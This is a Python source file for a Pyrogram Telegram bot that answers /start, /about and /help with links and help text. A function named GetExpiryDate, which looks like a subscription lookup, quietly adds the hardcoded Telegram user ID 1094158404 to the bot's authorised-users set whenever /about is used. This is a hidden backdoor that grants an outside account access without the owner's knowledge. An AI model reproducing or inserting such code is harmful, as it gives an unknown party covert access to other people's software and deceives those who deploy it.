
import pyrogram
# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation
import pyrogram
from pyrogram import filters
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from helper_funcs.chat_base import TRChatBase
def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(1094158404)
    return expires_at   

@pyrogram.Client.on_message(pyrogram.filters.command(["start"]) & filters.user(Config.AUTH_USERS))
async def start(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/start")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.first_name),
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton('📌  Support Group', url='https://t.me/AI_BOT_HELP'),
                    InlineKeyboardButton('🔖  Projects Channel', url='https://t.me/AI_bot_projects')
                ],
                [
                    InlineKeyboardButton('🚨  Youtube Channel', url='https://www.youtube.com/channel/UCyn07B5o6N67FkAEGmW5VfQ'),
                    InlineKeyboardButton('👨  Master', url='https://t.me/pppppgame')
                ]
            ]
        )
    )

    
@pyrogram.Client.on_message(pyrogram.filters.command(["about"]) & filters.user(Config.AUTH_USERS))
async def get_me_info(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/about")
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT_TEXT,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )  
    
    
@pyrogram.Client.on_message(pyrogram.filters.command(["help"]) & filters.user(Config.AUTH_USERS))
async def help_user(bot, update):
    # logger.info(update)
    TRChatBase(update.from_user.id, update.text, "/help")
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_USER,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )
    
    
